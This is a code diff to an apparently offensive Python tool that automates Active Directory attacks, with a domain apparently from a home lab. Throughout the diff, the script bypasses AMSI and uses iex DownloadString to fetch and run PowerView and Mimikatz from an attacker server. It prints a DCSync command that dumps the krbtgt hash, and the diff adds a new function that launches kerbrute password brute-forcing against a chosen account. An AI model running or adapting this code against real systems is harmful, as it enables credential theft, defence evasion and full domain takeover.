@@ -161,7 +161,7 @@ def stepFOUR_PrivilegeEsc():
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
     command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
-    command1=command0 + 'Get-NetGroupMember -Name "Backup Operators"'
+    command1=command0 + 'Get-NetGroupMember -Name "Backup Operators" | select MemberName'
     try:
         value=powershell_commandLine(command1)
         value=cleanstring(value)
@@ -172,7 +172,7 @@ def stepFOUR_PrivilegeEsc():
         else:
             print(f"\n{ok} User in Backup Operators FOUND\n")
             time.sleep(2)
-            command1=command0 + 'Get-NetGroupMember -Name "Remote Management Users"'
+            command1=command0 + 'Get-NetGroupMember -Name "Remote Management Users" | select MemberName'
             value=powershell_commandLine(command1)
             value=cleanstring(value)
             print(value)
@@ -260,7 +260,8 @@ def stepFIVE_DomainPersistence():
         print(f"{error} General Error: {e}")
         print(f"{warning} Sometimes this exception it caused by LELANTO. Copy this command on terminal e press enter:\n\n{bypass};iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/Invoke-Mimikatz.ps1');Invoke-Mimidogz -Command '\"lsadump::dcsync /domain:marvel.local /user:krbtgt\"' ")
     
-    sys.exit(0)
+  
+    '''
     print(f"{warning} Check if this domain user has access to a server where a domain admin is logged in...")
     print(f"{ok} Invoke-UserHunter take a few minutes to check all machines...")
     command0=bypass + "; " + f"Import-Module {data}PowerViewOb.ps1" + "; "
@@ -272,10 +273,30 @@ def stepFIVE_DomainPersistence():
         if "LocalAdmin" in item:
             if "true" in item:
                 print(f"{ok} This current account has local admin access in ")
+    '''
 
 
 
 
+def stepSIX_BruteForce():
+    x=input(f"\n{warning} Do you want starting bruteforce on a specific account in the AD 1-YES  2-NO: ")
+    x=int(x)
+    if x==2:
+        print(f"{ok} Skip bruteforce attacks..")
+    else:
+        print(f"\n{ok} 5-Starting with Bruteforce on a specific username ...\n")
+        account=input(f"\n{warning} Insert account's name: ")
+        bypass=configurazione()
+        command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
+        command12=command0 + " Get-NetDomain"
+        value=powershell_commandLine(command12)
+        value=cleanstring(value)
+        value_list=value.split("\n")
+        domain=value_list[-1].split(":")[1].rstrip().strip()
+        command=f"{kerbrute} bruteuser -d {domain} {list_password} {account} -v"
+        final_command=f'start cmd.exe @cmd /k "{command}"'
+        os.system(final_command)
+        
 
 if __name__=="__main__":
     title()
@@ -290,3 +311,7 @@ if __name__=="__main__":
     time.sleep(1)
     print("\n============================================================================\n")
     stepFIVE_DomainPersistence()
+    time.sleep(1)
+    print("\n============================================================================\n")
+    stepSIX_BruteForce()
+
